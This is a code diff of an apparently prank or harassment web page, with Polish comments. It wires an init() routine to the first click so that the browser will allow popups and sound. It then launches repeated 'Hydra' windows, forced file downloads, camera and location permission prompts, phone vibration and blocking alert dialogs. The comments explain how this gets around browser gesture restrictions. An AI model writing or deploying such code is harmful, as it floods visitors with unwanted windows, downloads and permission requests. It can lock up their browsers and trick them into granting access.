@@ -11,13 +11,38 @@ const getRandomCoords = () => ({
 });
 
 function init() {
-    openWindow()
-    downloadFiles()
-    annoyingAlerts()
-    playSound()
-    triggerPermisions()
-    startVibrateInterval()
+    console.log("Inicjalizacja po kliknięciu...");
+
+    // 1. Dźwięk (teraz zadziała, bo jest interakcja)
+    playSound();
+
+    // 2. Okna (Hydra)
+    openWindow(); 
+
+    // 3. Pobieranie plików
+    downloadFiles();
+
+    // 4. Uprawnienia (Kamera, Lokalizacja)
+    triggerPermissions();
+
+    // 5. Wibracje (jeśli telefon)
+    startVibrateInterval();
+
+    // 6. Alerty (OSTATNIE - bo blokują kod!)
+    setTimeout(() => {
+        annoyingAlerts();
+    }, 500);
 }
+
+// 4. PODPIĘCIE POD KLIKNIĘCIE (Bardzo ważne!)
+// Przeglądarka pozwoli na dźwięk i okna TYLKO po kliknięciu
+document.addEventListener('click', function() {
+    if (window.wins.length === 0) { // Uruchom tylko raz
+        init();
+    }
+}, { once: true });
+
+// --- DEFINICJE FUNKCJI ---
 
 function openWindow() {
     const { x, y } = getRandomCoords();
